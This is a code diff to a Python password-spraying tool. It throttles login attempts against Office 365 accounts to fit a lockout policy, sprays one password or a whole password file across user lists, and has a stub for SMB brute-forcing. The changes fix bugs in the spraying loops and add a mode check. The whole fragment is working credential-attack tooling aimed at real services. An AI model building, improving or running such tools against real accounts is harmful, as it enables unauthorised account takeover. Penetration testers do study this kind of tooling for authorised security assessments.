@@ -119,10 +119,6 @@ def check_o365(username):
         except:
             pass
 
-
-def get_credentials(auth):
-    t = type()
-
 def hybrid_office_worker(policy,user,_pass):
     attempts = 1
     max_attempts, timelimit = tuple(policy.split(','))
@@ -143,7 +139,7 @@ def hybrid_office_worker(policy,user,_pass):
                     sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
-            exit(0)
+            
             
     elif isinstance(_pass, str):
         #this shows we are spraying a single password against a userfile
@@ -154,13 +150,13 @@ def hybrid_office_worker(policy,user,_pass):
                     if attempts == max_attempts:
                         sleep(timelimit)
                         attempts = 1
-                    brute_office(user,password.strip("\n"))
+                    brute_office(username.strip("\n"),_pass)
                     attempts = attempts + 1
                     sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
-            exit(0)
-    else:
+            
+    elif isinstance(user, str) and isinstance(_pass, str):
         #this means we are spraying userfile against passfile.
         try:
             with open(_pass, 'r') as passfile, open(user,'r') as userfile:
@@ -170,11 +166,13 @@ def hybrid_office_worker(policy,user,_pass):
                             sleep(timelimit)
                             attempts = 1
                         #we can try to use threading here
-                        brute_office(user,password.strip("\n"))
+                        brute_office(username.strip("\n"),password.strip("\n"))
                         attempts = attempts + 1
                         sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
+    else:
+        print("[!]Unknown mode selected. Check the usage")
 
 def hybrid_smb_worker(policy,username="",password="",userfile="",passfile=""):
     #TODO: Run hybrid bruteforcing here using worker threads
